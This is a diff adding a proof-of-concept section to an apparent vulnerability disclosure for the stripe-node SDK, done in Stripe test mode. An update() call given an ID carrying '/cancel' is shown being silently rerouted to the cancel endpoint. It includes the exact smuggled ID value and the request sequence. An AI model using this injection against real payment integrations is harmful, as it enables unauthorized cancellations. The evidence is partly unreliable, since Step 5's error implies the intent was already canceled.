@@ -175,8 +175,129 @@ NODE
 4. Stripe receives `POST /v1/payment_intents/:id/cancel`, not the intended update route.
 
 
-### More tests:
+### Live API Test Evidence: Unencoded Path Parameter Injection:
 
+> **Test Mode Only** — All testing was performed exclusively against Stripe's test API. No live payment data was touched at any point.
+ 
+---
+ 
+## Step 1 — Set Stripe Test Secret Key
+ 
+```bash
+export STRIPE_TEST_SECRET_KEY='sk_test_key'
+```
+ 
+I confirmed the key was a test key because it started with:
+ 
+```
+sk_test_
+```
+ 
+---
+ 
+## Step 2 — Create a Disposable PaymentIntent
+ 
+```bash
+curl -sS https://api.stripe.com/v1/payment_intents \
+  -u "$STRIPE_TEST_SECRET_KEY:" \
+  -d amount=1000 \
+  -d currency=usd \
+  -d "metadata[poc]"="stripe-node-path-injection" \
+  -d "metadata[disposable]"="true"
+```
+ 
+Stripe returned this test PaymentIntent:
+ 
+```
+pi_3TQHMdFi97flIn7U03C3eOyN
+```
+ 
+I verified it was safe test-mode data:
+ 
+```json
+{
+  "id": "pi_3TQHMdFi97flIn7U03C3eOyN",
+  "status": "requires_payment_method",
+  "livemode": false
+}
+```
+ 
+> **The important part:** `livemode: false` — this confirms I was **not** touching live payment data.
+ 
+---
+ 
+## Step 3 — Trigger the Injection via the SDK
+ 
+I called the SDK method that is supposed to **update** a PaymentIntent:
+ 
+```js
+await stripe.paymentIntents.update(id, {
+  cancellation_reason: 'abandoned',
+});
+```
+ 
+But I controlled the `id` value and set it to:
+ 
+```
+pi_3TQHMdFi97flIn7U03C3eOyN/cancel
+```
+ 
+---
+ 
+## Step 4 — Observe the Injected Request
+ 
+So instead of the SDK sending the **intended** request:
+ 
+```
+POST /v1/payment_intents/pi_3TQHMdFi97flIn7U03C3eOyN
+```
+ 
+It sent this request:
+ 
+```
+POST /v1/payment_intents/pi_3TQHMdFi97flIn7U03C3eOyN/cancel
+```
+ 
+That is Stripe's **cancel** endpoint — not the update endpoint.
+ 
+---
+ 
+## Step 5 — Stripe's Response Confirms Endpoint Hit
+ 
+Stripe returned this error:
+ 
+```
+You cannot cancel this PaymentIntent because it has a status of canceled.
+```
+ 
+> This error **confirms** the cancel endpoint was reached. The normal update endpoint would never return a "cannot cancel" error.
+ 
+---
+ 
+## Step 6 — Retrieve PaymentIntent and Confirm State Change
+ 
+Finally, I retrieved the PaymentIntent again and confirmed the status had changed:
+ 
+```json
+{
+  "id": "pi_3TQHMdFi97flIn7U03C3eOyN",
+  "status": "canceled",
+  "livemode": false
+}
+```
+ 
+---
+ 
+## Conclusion
+ 
+This live test proves that when an attacker-controlled ID containing `/cancel` is passed into `stripe.paymentIntents.update()`:
+ 
+1. The SDK does **not** URL-encode the ID.
+2. The `/cancel` suffix escapes the intended path segment.
+3. The request is silently routed to Stripe's **cancel** endpoint instead of the **update** endpoint.
+4. The PaymentIntent status changed from `requires_payment_method` to `canceled` — confirming real, unintended state mutation on a Stripe object.
+
+### My terminal output:
 ```bash
 [keshavgoyal@hazelnut stripe-node]$ export STRIPE_TEST_SECRET_KEY='sk_test_key'
 
